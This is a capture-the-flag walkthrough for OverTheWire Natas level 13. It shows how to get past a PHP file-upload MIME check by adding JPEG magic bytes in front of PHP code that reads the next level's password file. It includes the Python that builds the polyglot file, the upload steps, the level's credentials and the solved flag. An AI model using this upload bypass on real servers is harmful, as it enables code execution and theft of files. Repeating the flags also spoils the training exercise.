# Level 13
## What does the page look like?
```html
$ curl -s --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org/

```
## Source code
```html
$ curl -s --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY http://natas13.natas.labs.overthewire.org//index-source.html | html2text 

```

## Vulnerability
This is the same kind of challenge as for the previous level, but this time, there is an additional control that will check the MIME type using the `exif_imagetype` function.

This additional control can be bypassed by creating a file that will contain both the `*.jpg` header (`\xFF\xD8\xFF\xE0`), and PHP code.

We will prepare a PHP file that will read the password file, and that we will be able to send to the server instead of the expected `*.jpg`:

## Exploitation
Let's first create our fake image:
```python
$ python2
>>> fh = open('hack.php', 'w')
>>> fh.write("\xFF\xD8\xFF\xE0" + "<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>")
>>> fh.close()
```
You can check that the `file` command identifies [`hack.php`](files/hack.php) as a picture:
~~~~
$ file hack.php 
hack.php: JPEG image data
~~~~
Because it contains the relevant header; however, our PHP code is there:
~~~~
$ xxd hack.php 
00000000: ffd8 ffe0 3c3f 7068 7020 6563 686f 2066  ....<?php echo f
00000010: 696c 655f 6765 745f 636f 6e74 656e 7473  ile_get_contents
00000020: 2827 2f65 7463 2f6e 6174 6173 5f77 6562  ('/etc/natas_web
00000030: 7061 7373 2f6e 6174 6173 3134 2729 3b20  pass/natas14'); 
00000040: 3f3e                                     ?>
~~~~

To exploit this vulnerability, open the developer toolbar, edit the code in the form and replace the value of `filename` by `hack.php`, and upload the script exactly as in the previous level.

# Flag
~~~~
natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
~~~~
